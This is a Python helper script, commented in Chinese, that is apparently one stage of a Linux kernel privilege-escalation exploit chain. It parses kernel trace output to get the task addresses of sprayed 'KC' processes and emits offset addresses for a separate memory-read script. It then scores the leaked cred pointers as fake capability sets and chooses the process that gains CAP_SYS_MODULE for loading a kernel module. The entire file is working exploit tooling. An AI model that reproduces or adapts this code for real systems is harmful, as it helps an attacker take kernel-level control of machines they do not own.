#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""cands.py — 候选进程解析与挑选

list : 从 trace 文本里解析每个候选进程的 task 地址，输出可直接喂给 rdx.sh 的地址串
pick : 根据读回来的 cred 值，按能力位挑一个最适合当提权目标的候选

能力集 = cred + 0x40 这个地址值本身；cred 是 0x40 对齐的，
所以 bit0..bit5（CHOWN/DAC_OVERRIDE/DAC_READ_SEARCH/FOWNER/FSETID/KILL）永远为 0，
不要指望它们。必须要有 bit16（CAP_SYS_MODULE）才能加载模块。

用法:
  cands.py list <trace_file> <out.json> [prefix]
  cands.py pick <cands.json> <cred_hex> [cred_hex ...]
"""
import json
import re
import sys

CAP = {
    0: "CHOWN", 1: "DAC_OVERRIDE", 2: "DAC_READ_SEARCH", 3: "FOWNER", 4: "FSETID",
    5: "KILL", 6: "SETGID", 7: "SETUID", 8: "SETPCAP", 9: "LINUX_IMMUTABLE",
    10: "NET_BIND", 11: "NET_BROADCAST", 12: "NET_ADMIN", 13: "NET_RAW",
    14: "IPC_LOCK", 15: "IPC_OWNER", 16: "SYS_MODULE", 17: "SYS_RAWIO",
    18: "SYS_CHROOT", 19: "SYS_PTRACE", 20: "SYS_PACCT", 21: "SYS_ADMIN",
    22: "SYS_BOOT", 23: "SYS_NICE", 24: "SYS_RESOURCE", 25: "SYS_TIME",
}
# 优先级：能加载模块是硬条件，其余越靠前越有用
SCORE_BITS = [(7, 8), (21, 4), (17, 2), (8, 2), (6, 1), (18, 1), (22, 1), (19, 1)]

LINE_RE = re.compile(
    r"(\w+)-(\d+)\s+\[\d+\].*comm: \(__set_task_comm\S*\)\s+"
    r"task=(0x[0-9a-f]+) real=(0x[0-9a-f]+) cred=(0x[0-9a-f]+)")


def do_list(trace_path, out_json, prefix):
    seen = {}
    rx = re.compile(r"^%s\d+$" % re.escape(prefix))
    with open(trace_path, encoding="utf-8", errors="replace") as f:
        for line in f:
            m = LINE_RE.search(line)
            if not m:
                continue
            name = m.group(1)
            if not rx.match(name):
                continue
            seen[name] = {"name": name, "pid": m.group(2), "task": m.group(3)}
    sel = [seen[k] for k in sorted(seen, key=lambda x: int(re.sub(r"\D", "", x) or 0))]
    if not sel:
        sys.stderr.write("没有从 trace 里解析到任何 %sN 进程\n" % prefix)
        return 1
    json.dump(sel, open(out_json, "w"), indent=1)
    print(" ".join(hex(int(s["task"], 16) + 0x908) for s in sel))
    return 0


def do_pick(json_path, creds_hex):
    sel = json.load(open(json_path))
    if len(creds_hex) != len(sel):
        sys.stderr.write("cred 数量(%d) 与候选数量(%d) 不一致\n" % (len(creds_hex), len(sel)))
        return 1
    best, rows = None, []
    for s, ch in zip(sel, creds_hex):
        c = int(ch, 16)
        if c == 0:
            rows.append((s["name"], 0, 0, [], False))
            continue
        eff = c + 0x40
        caps = [CAP[b] for b in sorted(CAP) if (eff >> b) & 1]
        has_mod = bool((eff >> 16) & 1)
        score = sum(w for b, w in SCORE_BITS if (eff >> b) & 1)
        rows.append((s["name"], c, eff, caps, has_mod))
        if has_mod and (best is None or score > best[0]):
            best = (score, s, c, eff, caps)

    for name, c, eff, caps, has_mod in rows:
        if c == 0:
            print("%-6s cred=? (读到 0，多半进程已退出)" % name)
            continue
        print("%-6s cred=%#018x eff=%#018x %-3s %s"
              % (name, c, eff, "OK" if has_mod else "--", ",".join(caps)))
    if not best:
        print("NONE")
        return 2
    score, s, c, eff, caps = best
    print("CHOSEN %s %s %s" % (s["name"], s["pid"], hex(c)))
    print("CAPS %s" % ",".join(caps))
    return 0


def main(argv):
    if len(argv) < 2:
        print(__doc__)
        return 1
    mode = argv[0]
    if mode == "list":
        return do_list(argv[1], argv[2], argv[3] if len(argv) > 3 else "KC")
    if mode == "pick":
        return do_pick(argv[1], argv[2:])
    print(__doc__)
    return 1


if __name__ == "__main__":
    sys.exit(main(sys.argv[1:]))
